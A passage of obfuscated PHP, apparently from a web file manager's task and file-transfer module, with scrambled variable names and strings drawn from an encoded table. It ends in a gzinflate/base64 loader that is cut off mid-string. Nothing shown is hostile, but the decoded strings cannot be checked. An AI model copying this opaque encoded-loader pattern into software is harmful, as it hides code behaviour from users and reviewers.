$»×‰ÚşĞ[$æú¹–µ£[1689]] - $»×‰ÚşĞ[$æú¹–µ£[1692]]; if ($áå¶ıß <= 0) { $áå¶ıß = 0.001; } $»×‰ÚşĞ[$æú¹–µ£[1687]] = $»×‰ÚşĞ[$æú¹–µ£[1686]] / $»×‰ÚşĞ[$æú¹–µ£[826]]; $»×‰ÚşĞ[$æú¹–µ£[1688]] = $»×‰ÚşĞ[$æú¹–µ£[1686]] / $áå¶ıß; if ($»×‰ÚşĞ[$æú¹–µ£[1687]] > 0) { $»×‰ÚşĞ[$æú¹–µ£[1693]] = $áå¶ıß * (1 - $»×‰ÚşĞ[$æú¹–µ£[1687]]) / $»×‰ÚşĞ[$æú¹–µ£[1687]]; } $»×‰ÚşĞ[$æú¹–µ£[1693]] = $»×‰ÚşĞ[$æú¹–µ£[1693]] <= 0 ? 0 : $»×‰ÚşĞ[$æú¹–µ£[1693]]; } $this->updateAfter(); $óšñòûç = 0.2; if (timeFloat() - $»×‰ÚşĞ[$æú¹–µ£[1691]] < $óšñòûç && !$êÑèÛÜ) { return; } $ãË×· = self::get($»×‰ÚşĞ[$æú¹–µ£[452]]); $×‹‚Áó = $ãË×·[$æú¹–µ£[790]]; if ($×‹‚Áó == self::STATYS_KILL) { $ßõß¥Ñ = array($æú¹–µ£[1703] => LNG($æú¹–µ£[1704]), $æú¹–µ£[1253] => !1); Cache::set($æú¹–µ£[1705] . $this->task[$æú¹–µ£[452]], $ßõß¥Ñ, 30); $this->onKill(); $this->end(); die; } else { if ($×‹‚Áó == self::STATYS_STOP) { $‹Üİ¹Íã = 2; $ãË×·[$æú¹–µ£[1692]] += $‹Üİ¹Íã; self::valueSet($»×‰ÚşĞ[$æú¹–µ£[452]], $ãË×·); sleep($‹Üİ¹Íã); $this->update(); return; } } $»×‰ÚşĞ[$æú¹–µ£[790]] = $×‹‚Áó ? $×‹‚Áó : $»×‰ÚşĞ[$æú¹–µ£[790]]; $»×‰ÚşĞ[$æú¹–µ£[1692]] = $ãË×·[$æú¹–µ£[1692]] ? $ãË×·[$æú¹–µ£[1692]] : 0; $»×‰ÚşĞ[$æú¹–µ£[1691]] = timeFloat(); Hook::trigger($æú¹–µ£[1706], $»×‰ÚşĞ); self::valueSet($»×‰ÚşĞ[$æú¹–µ£[452]], $»×‰ÚşĞ); } public function onKillSet($íÅ­›£, $À¤àß§÷ = array()) { $this->onKillCall = array($íÅ­›£, $À¤àß§÷); } public function onKill() { $ñ›œÈ˜Å =& $_SERVER[ú÷îèÆÜ]; self::log($ñ›œÈ˜Å[1699] . $this->task[$ñ›œÈ˜Å[452]] . $ñ›œÈ˜Å[1707]); Hook::trigger($ñ›œÈ˜Å[1708], $this->task); if (!$this->onKillCall) { return; } ActionApply($this->onKillCall[0], $this->onKillCall[1]); $this->onKillCall = !1; $this->task = !1; } protected function updateAfter() { } protected function startAfter() { } protected function endAfter() { } public function shutdownEvent() { $this->end(); } public function showJson($Ğï—‡×î) { $üİøÆ¥Ã =& $_SERVER[ú÷îèÆÜ]; Cache::set($üİøÆ¥Ã[1705] . $this->task[$üİøÆ¥Ã[452]], $Ğï—‡×î, 60); return $Ğï—‡×î; } public static function get($ÜÕ§šò») { $ãØİ¾ö =& $_SERVER[ú÷îèÆÜ]; $éô‹§ÓĞ = self::valueGet($ÜÕ§šò»); if (is_array($éô‹§ÓĞ) && $éô‹§ÓĞ[$ãØİ¾ö[1709]]) { $„áÒÊ‡¹ = ActionApply($éô‹§ÓĞ[$ãØİ¾ö[1709]], array($éô‹§ÓĞ)); $éô‹§ÓĞ = is_array($„áÒÊ‡¹) ? $„áÒÊ‡¹ : $éô‹§ÓĞ; } return $éô‹§ÓĞ; } public static function listData() { $ßÇÛÜ´ = self::valueGet(); return array_sort_by($ßÇÛÜ´, $_SERVER[ú÷îèÆÜ][1689], !0); } public static function kill($ÁØôĞş) { return self::changeStatus($ÁØôĞş, self::STATYS_KILL); } public static function stop($­ÕÉÕâÖ) { return self::changeStatus($­ÕÉÕâÖ, self::STATYS_STOP); } public static function restart($—ı‘…­î) { return self::changeStatus($—ı‘…­î, self::STATYS_RUNNING); } public static function killAll() { $Œû‹¯™È =& $_SERVER[ú÷îèÆÜ]; $êèòÃİ = self::listData(); foreach ($êèòÃİ as $ÙÎ¼òœğ) { self::kill($ÙÎ¼òœğ[$Œû‹¯™È[452]]); } sleep(2); foreach ($êèòÃİ as $ÙÎ¼òœğ) { self::valueSet($ÙÎ¼òœğ[$Œû‹¯™È[452]], !1); } } private static function changeStatus($¶ë‚ˆ¶¯, $ßĞâ–ô) { $ò’Æ…šé =& $_SERVER[ú÷îèÆÜ]; $öĞÅƒÙ° = self::valueGet($¶ë‚ˆ¶¯); if (!$öĞÅƒÙ°) { return !1; } $öĞÅƒÙ°[$ò’Æ…šé[790]] = $ßĞâ–ô; self::valueSet($¶ë‚ˆ¶¯, $öĞÅƒÙ°); self::log($ò’Æ…šé[1710] . $öĞÅƒÙ°[$ò’Æ…šé[452]] . $ò’Æ…šé[1711] . $ßĞâ–ô); return !0; } public static function valueGet($ƒîíìÈ­ = false) { $ó½¡·Á =& $_SERVER[ú÷îèÆÜ]; if ($ƒîíìÈ­) { $§«§„† = Model($ó½¡·Á[497])->where(array($ó½¡·Á[104] => $ƒîíìÈ­, $ó½¡·Á[43] => $ó½¡·Á[1112]))->find(); return $§«§„† ? json_decode($§«§„†[$ó½¡·Á[427]], !0) : !1; } return self::taskListUser(USER_ID); } public static function taskListUser($…Æ¶¯êÁ = false) { $ƒáëõÀå =& $_SERVER[ú÷îèÆÜ]; $Ã´—Ë‚Ä = array($ƒáëõÀå[43] => $ƒáëõÀå[1112]); if ($…Æ¶¯êÁ) { $Ã´—Ë‚Ä[$ƒáëõÀå[1685]] = $…Æ¶¯êÁ; } $©íÀä¦® = Model($ƒáëõÀå[497])->where($Ã´—Ë‚Ä)->select(); $©íÀä¦® = $©íÀä¦® ? $©íÀä¦® : array(); foreach ($©íÀä¦® as $Û™Ê½¥  => $ëŸğØÖ¿) { $©íÀä¦®[$Û™Ê½¥ ] = json_decode($ëŸğØÖ¿[$ƒáëõÀå[427]], !0); } return $©íÀä¦®; } public static function valueSet($¹ı˜êø, $é‘«ÉŒí) { $¦ñÜ‰Ò =& $_SERVER[ú÷îèÆÜ]; if (!$é‘«ÉŒí) { return Model($¦ñÜ‰Ò[497])->where(array($¦ñÜ‰Ò[104] => $¹ı˜êø, $¦ñÜ‰Ò[43] => $¦ñÜ‰Ò[1112]))->delete(); } $ì¨Â™Òê = json_encode($é‘«ÉŒí); if (!$ì¨Â™Òê) { ob_start(); var_dump($é‘«ÉŒí); $«‰É§™ö = ob_get_clean(); self::log($¦ñÜ‰Ò[1712] . json_encode_force($«‰É§™ö)); } if (!$¹ı˜êø || !$é‘«ÉŒí[$¦ñÜ‰Ò[452]]) { return !1; } $æ‹©ğè = array($¦ñÜ‰Ò[43] => $¦ñÜ‰Ò[1112], $¦ñÜ‰Ò[1685] => USER_ID, $¦ñÜ‰Ò[104] => $¹ı˜êø, $¦ñÜ‰Ò[427] => $ì¨Â™Òê); $¯Íö“¡ = $¦ñÜ‰Ò[1713]; CacheLock::lock($¯Íö“¡); Model($¦ñÜ‰Ò[497])->add($æ‹©ğè, array(), !0); CacheLock::unlock($¯Íö“¡); } public static function log($ºõÃ‘€) { if (!GLOBAL_DEBUG) { return; } write_log($ºõÃ‘€, $_SERVER[ú÷îèÆÜ][1714]); } } class TaskFileTransfer extends Task { protected function startAfter() { $“¥Ö…€Ï =& $_SERVER[ú÷îèÆÜ]; $¨à€•Ÿ =& $this->task; $this->sourceCopyFolder = !1; Hook::bind($“¥Ö…€Ï[1715], array($this, $“¥Ö…€Ï[1716])); Hook::bind($“¥Ö…€Ï[1264], array($this, $“¥Ö…€Ï[1717])); Hook::bind($“¥Ö…€Ï[1718], array($this, $“¥Ö…€Ï[1719])); Hook::bind($“¥Ö…€Ï[645], array($this, $“¥Ö…€Ï[1720])); Hook::bind($“¥Ö…€Ï[646], array($this, $“¥Ö…€Ï[1721])); Hook::bind($“¥Ö…€Ï[653], array($this, $“¥Ö…€Ï[1722])); Hook::bind($“¥Ö…€Ï[654], array($this, $“¥Ö…€Ï[1723])); Hook::bind($“¥Ö…€Ï[648], array($this, $“¥Ö…€Ï[1724])); Hook::bind($“¥Ö…€Ï[651], array($this, $“¥Ö…€Ï[1725])); Hook::bind($“¥Ö…€Ï[614], array($this, $“¥Ö…€Ï[1726])); Hook::bind($“¥Ö…€Ï[611], array($this, $“¥Ö…€Ï[1726])); Hook::bind($“¥Ö…€Ï[616], array($this, $“¥Ö…€Ï[1726])); Hook::bind($“¥Ö…€Ï[618], array($this, $“¥Ö…€Ï[1726])); Hook::bind($“¥Ö…€Ï[620], array($this, $“¥Ö…€Ï[1726])); Hook::bind($“¥Ö…€Ï[1727], array($this, $“¥Ö…€Ï[1728])); Hook::bind($“¥Ö…€Ï[636], array($this, $“¥Ö…€Ï[1729])); $this->sourceModelCopyFlag = !1; Hook::bind($“¥Ö…€Ï[1730], array($this, $“¥Ö…€Ï[1731])); Hook::bind($“¥Ö…€Ï[1732], array($this, $“¥Ö…€Ï[1733])); Hook::bind($“¥Ö…€Ï[1734], array($this, $“¥Ö…€Ï[1735])); $¨à€•Ÿ[$“¥Ö…€Ï[1736]] = LNG($“¥Ö…€Ï[1737]); $¨à€•Ÿ[$“¥Ö…€Ï[1738]] = 0; $¨à€•Ÿ[$“¥Ö…€Ï[1739]] = 0; $¨à€•Ÿ[$“¥Ö…€Ï[1105]] = $“¥Ö…€Ï[22]; $¨à€•Ÿ[$“¥Ö…€Ï[1740]] = $“¥Ö…€Ï[22]; $¨à€•Ÿ[$“¥Ö…€Ï[1741]] = 0; $¨à€•Ÿ[$“¥Ö…€Ï[1742]] = 0; $¨à€•Ÿ[$“¥Ö…€Ï[1743]] = 0; if (!$¨à€•Ÿ[$“¥Ö…€Ï[1582]]) { $¨à€•Ÿ[$“¥Ö…€Ï[1582]] = LNG($“¥Ö…€Ï[1744]); } } protected function endAfter() { $ìÌØâÊ” =& $_SERVER[ú÷îèÆÜ]; Hook::unbind($ìÌØâÊ”[1715], array($this, $ìÌØâÊ”[1716])); Hook::unbind($ìÌØâÊ”[1264], array($this, $ìÌØâÊ”[1717])); Hook::unbind($ìÌØâÊ”[1718], array($this, $ìÌØâÊ”[1719])); Hook::unbind($ìÌØâÊ”[645], array($this, $ìÌØâÊ”[1720])); Hook::unbind($ìÌØâÊ”[646], array($this, $ìÌØâÊ”[1721])); Hook::unbind($ìÌØâÊ”[653], array($this, $ìÌØâÊ”[1722])); Hook::unbind($ìÌØâÊ”[654], array($this, $ìÌØâÊ”[1723])); Hook::unbind($ìÌØâÊ”[648], array($this, $ìÌØâÊ”[1724])); Hook::unbind($ìÌØâÊ”[651], array($this, $ìÌØâÊ”[1725])); Hook::unbind($ìÌØâÊ”[614], array($this, $ìÌØâÊ”[1726])); Hook::unbind($ìÌØâÊ”[611], array($this, $ìÌØâÊ”[1726])); Hook::unbind($ìÌØâÊ”[616], array($this, $ìÌØâÊ”[1726])); Hook::unbind($ìÌØâÊ”[618], array($this, $ìÌØâÊ”[1726])); Hook::unbind($ìÌØâÊ”[620], array($this, $ìÌØâÊ”[1726])); Hook::unbind($ìÌØâÊ”[1727], array($this, $ìÌØâÊ”[1728])); Hook::unbind($ìÌØâÊ”[636], array($this, $ìÌØâÊ”[1729])); Hook::unbind($ìÌØâÊ”[1730], array($this, $ìÌØâÊ”[1731])); Hook::unbind($ìÌØâÊ”[1732], array($this, $ìÌØâÊ”[1733])); Hook::unbind($ìÌØâÊ”[1734], array($this, $ìÌØâÊ”[1735])); } public function copyMoveStart($î†€ÖÜï, $Á¿Ò¦í¾, $í¥è¶¶“, $İ¬¬ÊÅÆ) { $ÕŠØéé· =& $_SERVER[ú÷îèÆÜ]; self::log($ÕŠØéé·[1745] . $Á¿Ò¦í¾ . $ÕŠØéé·[80] . $İ¬¬ÊÅÆ); $òÔƒú×¦ = rtrim(TEMP_FILES, $ÕŠØéé·[18]); if (substr($Á¿Ò¦í¾, 0, strlen($òÔƒú×¦)) == $òÔƒú×¦) { return; } if (substr($İ¬¬ÊÅÆ, 0, strlen($òÔƒú×¦)) == $òÔƒú×¦) { return; } $šÅÕÚïœ =& $this->task; $šÅÕÚïœ[$ÕŠØéé·[1746]] = KodIO::transferType($î†€ÖÜï, $í¥è¶¶“); $this->update(); } public function updateAfter() { $ö´¬ ¡± =& $_SERVER[ú÷îèÆÜ]; $ôßÉ¥í‰ =& $this->task; if (!$ôßÉ¥í‰[$ö´¬ ¡±[803]]) { return; } if ($this->sourceModelCopyFlag) { return; } if ($ôßÉ¥í‰[$ö´¬ ¡±[1746]] == $ö´¬ ¡±[1356]) { return; } self::updateTask($ôßÉ¥í‰); } private static function updateTask(&$²ÑÑÂÁÊ) { $Ø¹ÚëĞÇ =& $_SERVER[ú÷îèÆÜ]; if ($²ÑÑÂÁÊ[$Ø¹ÚëĞÇ[1746]] == $Ø¹ÚëĞÇ[1235] || $²ÑÑÂÁÊ[$Ø¹ÚëĞÇ[1746]] == $Ø¹ÚëĞÇ[117]) { if ($²ÑÑÂÁÊ[$Ø¹ÚëĞÇ[1740]]) { $²ÑÑÂÁÊ[$Ø¹ÚëĞÇ[1743]] = $²ÑÑÂÁÊ[$Ø¹ÚëĞÇ[1742]] + $²ÑÑÂÁÊ[$Ø¹ÚëĞÇ[1739]]; } } else { if ($²ÑÑÂÁÊ[$Ø¹ÚëĞÇ[1746]] == $Ø¹ÚëĞÇ[1357]) { if ($²ÑÑÂÁÊ[$Ø¹ÚëĞÇ[1740]] == $Ø¹ÚëĞÇ[1235]) { $²ÑÑÂÁÊ[$Ø¹ÚëĞÇ[1743]] = $²ÑÑÂÁÊ[$Ø¹ÚëĞÇ[1742]] + $²ÑÑÂÁÊ[$Ø¹ÚëĞÇ[1739]] * 0.5; } else { if ($²ÑÑÂÁÊ[$Ø¹ÚëĞÇ[1740]] == $Ø¹ÚëĞÇ[117]) { $²ÑÑÂÁÊ[$Ø¹ÚëĞÇ[1743]] = $²ÑÑÂÁÊ[$Ø¹ÚëĞÇ[1742]] + $²ÑÑÂÁÊ[$Ø¹ÚëĞÇ[1738]] * 0.5 + $²ÑÑÂÁÊ[$Ø¹ÚëĞÇ[1739]] * 0.5; } } } } $²ÑÑÂÁÊ[$Ø¹ÚëĞÇ[1687]] = $²ÑÑÂÁÊ[$Ø¹ÚëĞÇ[1743]] / $²ÑÑÂÁÊ[$Ø¹ÚëĞÇ[803]]; if ($²ÑÑÂÁÊ[$Ø¹ÚëĞÇ[1687]] > 0) { $°§²ù¬É = timeFloat() - $²ÑÑÂÁÊ[$Ø¹ÚëĞÇ[1689]] - $²ÑÑÂÁÊ[$Ø¹ÚëĞÇ[1692]]; $²ÑÑÂÁÊ[$Ø¹ÚëĞÇ[1693]] = $°§²ù¬É * (1 - $²ÑÑÂÁÊ[$Ø¹ÚëĞÇ[1687]]) / $²ÑÑÂÁÊ[$Ø¹ÚëĞÇ[1687]]; } } public function addPath($À°É‹’Ş) { $è÷ÍÁô =& $_SERVER[ú÷îèÆÜ]; if (!$À°É‹’Ş) { return; } $ú¾ìöİÙ =& $this->task; $­Æñ‘¾ª = IO::infoWithChildren($À°É‹’Ş); $¤ŞÏõêÓ = $ú¾ìöİÙ[$è÷ÍÁô[1747]] ? $ú¾ìöİÙ[$è÷ÍÁô[1747]][$è÷ÍÁô[1748]] : 0; $ú¾ìöİÙ[$è÷ÍÁô[1747]] = array($è÷ÍÁô[1748] => $¤ŞÏõêÓ + 1, $è÷ÍÁô[471] => $­Æñ‘¾ª[$è÷ÍÁô[42]], $è÷ÍÁô[94] => $­Æñ‘¾ª[$è÷ÍÁô[94]], $è÷ÍÁô[560] => $­Æñ‘¾ª[$è÷ÍÁô[560]] ? $­Æñ‘¾ª[$è÷ÍÁô[560]] : $­Æñ‘¾ª[$è÷ÍÁô[94]]); if ($­Æñ‘¾ª[$è÷ÍÁô[43]] == $è÷ÍÁô[224]) { $ú¾ìöİÙ[$è÷ÍÁô[826]] += 1; } else { $ú¾ìöİÙ[$è÷ÍÁô[826]] += $­Æñ‘¾ª[$è÷ÍÁô[89]][$è÷ÍÁô[87]]; if ($­Æñ‘¾ª[$è÷ÍÁô[191]]) { $ú¾ìöİÙ[$è÷ÍÁô[826]] += $­Æñ‘¾ª[$è÷ÍÁô[89]][$è÷ÍÁô[88]] + 1; } } $ú¾ìöİÙ[$è÷ÍÁô[803]] += $­Æñ‘¾ª[$è÷ÍÁô[86]]; $this->update(); } public function sourceCopyFolderStart() { $this->sourceCopyFolder = !0; } public function sourceCopyFolderEnd() { $this->sourceCopyFolder = !1; } public function sourceAddHashStart($‰¾Ó¾ë) { } public function sourceAddHashEnd($·È…Ò¿ı) { } public function sourceAddFileStart($ñâş‘Õ) { $±èë×¾Ë =& $_SERVER[ú÷îèÆÜ]; $ç©’¥Ş =& $this->task; $ç©’¥Ş[$±èë×¾Ë[1738]] = $ñâş‘Õ[$±èë×¾Ë[86]]; $ç©’¥Ş[$±èë×¾Ë[1736]] = $ñâş‘Õ[$±èë×¾Ë[42]]; $ç©’¥Ş[$±èë×¾Ë[1105]] = $ñâş‘Õ[$±èë×¾Ë[42]]; $ç©’¥Ş[$±èë×¾Ë[1749]] = $ñâş‘Õ[$±èë×¾Ë[94]]; $this->update(); } public function sourceAddFileEnd($Øè¯Öƒ­) { $–…–‚­ =& $_SERVER[ú÷îèÆÜ]; $şè£—´· =& $this->task; $şè£—´·[$–…–‚­[1743]] += $Øè¯Öƒ­[$–…–‚­[86]]; $şè£—´·[$–…–‚­[1749]] = $Øè¯Öƒ­[$–…–‚­[94]]; $this->update(1); } public function copyFileStart($€ùÔ²¾×, $Í“¬ôææ, $°š¦¢¯Ï, $„ŒÈÌ¡Š, $ÀôßèÔì, $ªØêŸ÷) { $üÎÛ‰¢Õ =& $_SERVER[ú÷îèÆÜ]; $‰™ì·£Ä = $ÀôßèÔì; if ($‰™ì·£Ä == $GLOBALS[$üÎÛ‰¢Õ[1750]]) { $‰™ì·£Ä = $GLOBALS[$üÎÛ‰¢Õ[1751]]; } $GLOBALS[$üÎÛ‰¢Õ[1751]] = $ÀôßèÔì; $GLOBALS[$üÎÛ‰¢Õ[1750]] = $ªØêŸ÷; $‡êÒ‡ö¬ =& $this->task; $‡êÒ‡ö¬[$üÎÛ‰¢Õ[1736]] = $‰™ì·£Ä; $‡êÒ‡ö¬[$üÎÛ‰¢Õ[1738]] = (int) $€ùÔ²¾×->size($Í“¬ôææ); $‡êÒ‡ö¬[$üÎÛ‰¢Õ[1739]] = 0; $‡êÒ‡ö¬[$üÎÛ‰¢Õ[1105]] = $üÎÛ‰¢Õ[22]; $‡êÒ‡ö¬[$üÎÛ‰¢Õ[1740]] = $üÎÛ‰¢Õ[22]; $‡êÒ‡ö¬[$üÎÛ‰¢Õ[1741]] = 0; $¦¬É©÷ç = $‡êÒ‡ö¬[$üÎÛ‰¢Õ[1738]] > 1024 * 1024 * 10 ? !0 : !1; Cache::remove($‡êÒ‡ö¬[$üÎÛ‰¢Õ[452]] . $üÎÛ‰¢Õ[1752]); if ($¦¬É©÷ç && file_exists(get_path_father($„ŒÈÌ¡Š))) { Cache::set($‡êÒ‡ö¬[$üÎÛ‰¢Õ[452]] . $üÎÛ‰¢Õ[1752], $„ŒÈÌ¡Š); $‡êÒ‡ö¬[$üÎÛ‰¢Õ[1709]] = array($üÎÛ‰¢Õ[1753], $üÎÛ‰¢Õ[1754]); } $this->update(0, $¦¬É©÷ç); } public static function updateCopyLocalFileSize($…‚æ˜´Ø) { $§‚‡‘»Ú =& $_SERVER[ú÷îèÆÜ]; $¥¦Ü”¡€ = Cache::get($…‚æ˜´Ø[$§‚‡‘»Ú[452]] . $§‚‡‘»Ú[1752]); if (!$¥¦Ü”¡€ || !file_exists($¥¦Ü”¡€)) { return $…‚æ˜´Ø; } $…‚æ˜´Ø[$§‚‡‘»Ú[1739]] = @filesize($¥¦Ü”¡€); $…‚æ˜´Ø[$§‚‡‘»Ú[1743]] += $…‚æ˜´Ø[$§‚‡‘»Ú[1739]]; self::updateTask($…‚æ˜´Ø); return $…‚æ˜´Ø; } public function copyFileEnd($Ï†«‹Ï, $ëßñÛ—Ù, $ÄÚ±çü, $´Ñîªœ‚, $ŞéãÍ½í, $°¨¡ÂÈ±) { $³ò”ÚÜğ =& $_SERVER[ú÷îèÆÜ]; $›‘”Ñ =& $this->task; $›‘”Ñ[$³ò”ÚÜğ[1739]] = $›‘”Ñ[$³ò”ÚÜğ[1738]]; $›‘”Ñ[$³ò”ÚÜğ[1740]] = $³ò”ÚÜğ[22]; unset($›‘”Ñ[$³ò”ÚÜğ[1709]]); if ($ŞéãÍ½í == $›‘”Ñ[$³ò”ÚÜğ[1736]]) { $›‘”Ñ[$³ò”ÚÜğ[1742]] += $›‘”Ñ[$³ò”ÚÜğ[1738]]; $›‘”Ñ[$³ò”ÚÜğ[1743]] = $›‘”Ñ[$³ò”ÚÜğ[1742]]; $Ÿ–Ù¯¯ş = 1; if (isset($›‘”Ñ[$³ò”ÚÜğ[1749]]) && $›‘”Ñ[$³ò”ÚÜğ[1749]] == $ëßñÛ—Ù) { $Ÿ–Ù¯¯ş = 0; } $this->update($Ÿ–Ù¯¯ş); } else { $this->update(); $›‘”Ñ[$³ò”ÚÜğ[1739]] = 0; } Cache::remove($›‘”Ñ[$³ò”ÚÜğ[452]] . $³ò”ÚÜğ[1752]); self::log($³ò”ÚÜğ[1755] . $ëßñÛ—Ù . $³ò”ÚÜğ[80] . $´Ñîªœ‚ . $³ò”ÚÜğ[11] . $ŞéãÍ½í . $³ò”ÚÜğ[1756] . $›‘”Ñ[$³ò”ÚÜğ[1736]]); } public function updateFileEnd($üÚƒì·›, $£¦Ğ„®“) { $ĞÂ×ù¶ =& $_SERVER[ú÷îèÆÜ]; $çé“Ÿï =& $this->task; $çé“Ÿï[$ĞÂ×ù¶[1736]] = $üÚƒì·›; $çé“Ÿï[$ĞÂ×ù¶[1738]] = $£¦Ğ„®“; $çé“Ÿï[$ĞÂ×ù¶[1742]] += $£¦Ğ„®“; $çé“Ÿï[$ĞÂ×ù¶[1743]] = $çé“Ÿï[$ĞÂ×ù¶[1742]]; $this->update(1); self::log($ĞÂ×ù¶[1757] . $üÚƒì·›); } public function sourceModelCopy($âš¥¿¥ª) { $˜Î¸ªµ =& $_SERVER[ú÷îèÆÜ]; $ÈáØÌæ = $âš¥¿¥ª[0]; $³¦±§á = $âš¥¿¥ª[1]; $µ›ĞÄÖí =& $this->task; $this->sourceModelCopyFlag = !0; $¸÷šª¨ = 0; switch ($ÈáØÌæ) { case $˜Î¸ªµ[612]: $¸÷šª¨ = 1; break; case $˜Î¸ªµ[615]: $µ›ĞÄÖí[$˜Î¸ªµ[1736]] = $³¦±§á[$˜Î¸ªµ[42]]; break; case $˜Î¸ªµ[617]: $¸÷šª¨ = intval($âš¥¿¥ª[$˜Î¸ªµ[433]] * 0.4); break; case $˜Î¸ªµ[619]: $¸÷šª¨ = intval($âš¥¿¥ª[$˜Î¸ªµ[433]] * 0.2); break; case $˜Î¸ªµ[621]: $¸÷šª¨ = intval($âš¥¿¥ª[$˜Î¸ªµ[433]] * 0.4); break; } $this->update($¸÷šª¨); $this->sourceModelCopyFlag = !1; } public function sourceRemove($ªİË“İ, $ÄÅ§†¢Ë) { $™ã“ÅïÄ =& $_SERVER[ú÷îèÆÜ]; $this->sourceModelCopyFlag = !0; $‘‚Á£¾² = 1; if (isset($ªİË“İ[$™ã“ÅïÄ[89]])) { $‘‚Á£¾² = $ªİË“İ[$™ã“ÅïÄ[89]][$™ã“ÅïÄ[87]]; $‘‚Á£¾² = $‘‚Á£¾² + $ªİË“İ[$™ã“ÅïÄ[89]][$™ã“ÅïÄ[88]] + 1; } $this->update($‘‚Á£¾²); $this->sourceModelCopyFlag = !1; } public function sourceMove($šéšÆµ) { $this->sourceRemove($šéšÆµ, !1); } public function curlProgress($©¡‹©êı, $¶óâ†ö§, $ëŞ¢Á¼Ô, $Ì§”©Ş‡, $ÜÊÃÎŠü) { $¿ß€±ª =& $_SERVER[ú÷îèÆÜ]; $¹†Àùò =& $this->task; if ($ÜÊÃÎŠü > 0) { $¹†Àùò[$¿ß€±ª[1105]] = $¿ß€±ª[1758]; $¹†Àùò[$¿ß€±ª[1740]] = $¿ß€±ª[117]; if ($¹†Àùò[$¿ß€±ª[1738]]) { $¹†Àùò[$¿ß€±ª[1739]] = $ÜÊÃÎŠü; } if ($¹†Àùò[$¿ß€±ª[1741]]) { $¹†Àùò[$¿ß€±ª[1739]] = $ÜÊÃÎŠü + $¹†Àùò[$¿ß€±ª[1741]]; } } else { if ($ëŞ¢Á¼Ô > 0) { if ($¹†Àùò[$¿ß€±ª[1738]] == $¶óâ†ö§) { $¹†Àùò[$¿ß€±ª[1739]] = $ëŞ¢Á¼Ô; $¹†Àùò[$¿ß€±ª[1105]] = $¿ß€±ª[1759]; $¹†Àùò[$¿ß€±ª[1740]] = $¿ß€±ª[1235]; } } } $this->update(); } public function curlProgressStart($†•ÍĞÔ½) { } public function curlProgressEnd($¸Ã†¼¥¶) { $¦ş›éÄƒ =& $_SERVER[ú÷îèÆÜ]; $âÓ³İ©‡ =& $this->task; $ÒæÈãÔ = curl_getinfo($¸Ã†¼¥¶); $Ì˜ˆ°Ã = $ÒæÈãÔ[$¦ş›éÄƒ[1760]]; if ($Ì˜ˆ°Ã == -1) { $Ì˜ˆ°Ã = $ÒæÈãÔ[$¦ş›éÄƒ[1761]]; } if ($âÓ³İ©‡[$¦ş›éÄƒ[1740]] == $¦ş›éÄƒ[117] && $Ì˜ˆ°Ã) { $âÓ³İ©‡[$¦ş›éÄƒ[1741]] += $Ì˜ˆ°Ã; } $this->update(); } } goto EˆøŞÌ‘î; B„”¦À»Ù: while ($wiljtgcdpa < $_SERVER[ú÷îèÆÜ][12]) { if ($wiljtgcdpa >= 0) { break; } $wiljtgcdpa++; } $_SERVER[û¬ú¢è] = explode($_SERVER[ú÷îèÆÜ][658], gzinflate(substr($_SERVER[ú÷îèÆÜ][659], 10, -8))); $feoykidnmp = $_SERVER[ú÷îèÆÜ][660]; goto fàøë‡¬†¶; B…í’ºä¢: if (!function_exists('_kodDe')) { function _kodDe($str) { $str = base64_decode($str); $l = strlen($str); $result = ''; $offset = ord($str[0]) - 30; for ($i = 1; $i < $l; $i += 2) { if ($i + 1 < $l) { $result .= chr(ord($str[$i + 1]) + $offset); $result .= chr(ord($str[$i]) + $offset); } else { $result .= chr(ord($str[$i]) + $offset); } } return $result; } } define("\372\367\356\350\306\334", "\244\265\222\371\373\304"); $_SERVER[ú÷îèÆÜ] = explode("\x7c\x3\x7c\x1\x7c\x2", gzinflate(substr(base64_decode('H4sIAAAAAAAAE8W9CXhbxdUwXAqlhLJ0oQR4oVwMiZ1Ei+0kTnBigmzLsYgsGUnOZg==')."\233\233\153\351\332\122\54\351\52\272\127\336\102\136\366\75\54\245\254\205\266\54\145\351\327\22\240\5\12\201\100\13\205\276\155\312\13\205\322\102\51\245\245\131\330\51\224\322\227".base64_decode('pfDNcs7M3CsZ3v/5/+f58yTRzJnlznLmzJkz55y554otD59928l7nrzHyZ9/eeuV7w==')."\377\362\172\36\46\377\357\105\376\261\360\221\27\354\363\71\366\347\153\27\234\337\320\320\335\262\357\274\330\176\27\337\165\233\261\305\370\201\161\121\74\272\375\67\221\375\377\373\107"."\x27\x84\x77\xdd\xb8\x7d\x72\xd7\x1e\x9f\xbb\xf4\x94\x5f\x7d\xd4\x4a\x32\xf3\xb2\xad\xfc\x47\x2b\x5a\x8e\x66\x4e\xe4\x6c\xc7\xe6\x0\xdd\x18\xce\xe5\xcd\x64\x6e\xca\x8c\x14\xbd\x10\x1e\xa7\x31\x7d"."\xc4\x74\xf4\xb4\x55\x74\xcc\x22\x16\x6c\xf\x25\x23\x1d\x7a\x6f\x28\xd5\xcd\xe3\x46\xa9\x14\xb4\x33\xa3\x76\xd0\x28\xa7\xb3\xb9\x31\x33\x9a\x1b\xa\xe\xe5\x8a\xc1\x8c\xe1\x18\x1\x12\xe0\xb9\xf6"."\xe5\x3f\xb\xf8\x4f\x3a\x6b\xa6\x47\x75\x63\xc8\x2a\x3b\x66\x86\x83\x2a\xc5\x7c\xae\x38\xaa\xb6\x4\xb2\x5a\xc5\xe1\xdc\x8\xf\x63\x65\x41\xfe\xd3\x97\x88\x96\xcd\x82\xe5\x40\xce\x0\x14\x16\xe3"."\107\376\267\67\344\163\230\256\307\342\51\75\331\327\333\33\116\244\40\123\253\232\136\260\62\20\52\31\145\243\0\335\55\231\145\233\214\232\132\235\136\262\112\146\321\5\221\0\332"."\xed\x21\xc3\x86\x9a\x3a\xdb\xf5\xce\x70\x6f\x34\xbe\x46\x4f\xad\xe9\xd\x43\x8e\x21\x7d\x43\xc5\x2c\x4f\xf2\x18\xb\x26\x1d\xa3\xec\xa4\x72\x5\x53\xe4\x18\x2f\x8b\x76\xb5\x87\x97\x47\x62\x5a\x2a"."\x11\x8a\x25\x43\x1d\xa9\x48\x3c\xc6\xc1\x1d\xf1\x9e\x9e\x48\xaa\x1a\x9e\x88\x47\xa3\xed\xa1\x8e\x15\xd5\x29\xbd\x89\xd0\xf2\x9e\x90\x46\xda\x47\x26\x36\x57\x1c\xb6\x1a\xb4\x75\x3c\x65\x9d\x36\x87".strrev('U€¤æéØ+œ©HÕ:´aä¨ØsB&$yçÉX©ĞD"R„Éœs`h¤&